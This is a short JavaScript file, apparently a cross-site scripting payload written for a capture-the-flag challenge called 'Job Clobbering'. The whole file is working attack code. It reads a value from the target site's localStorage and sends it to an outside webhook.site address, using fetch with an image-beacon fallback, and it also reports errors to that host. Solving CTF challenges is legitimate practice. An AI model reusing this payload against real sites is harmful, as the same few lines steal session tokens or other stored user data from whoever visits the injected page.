// Exfiltration script for Job Clobbering CTF challenge
// This script runs in the context of the target site and extracts the flag from localStorage

try {
    const flag = localStorage.getItem('flag');

    if (flag) {
        // Primary exfiltration via fetch
        fetch('https://webhook.site/4cc4674b-6ecf-4ef3-b223-44f24c4f5b63/?flag=' + encodeURIComponent(flag))
            .catch(() => {});

        // Backup exfiltration via Image
        new Image().src = 'https://webhook.site/4cc4674b-6ecf-4ef3-b223-44f24c4f5b63/?img=' + encodeURIComponent(flag);

        // Console log for debugging (in case you're testing locally)
        console.log('Flag extracted:', flag);
    } else {
        // Report if flag not found
        fetch('https://webhook.site/4cc4674b-6ecf-4ef3-b223-44f24c4f5b63/?error=no_flag_found')
            .catch(() => {});
    }
} catch (e) {
    // Report any errors
    fetch('https://webhook.site/4cc4674b-6ecf-4ef3-b223-44f24c4f5b63/?error=' + encodeURIComponent(e.message))
        .catch(() => {});
}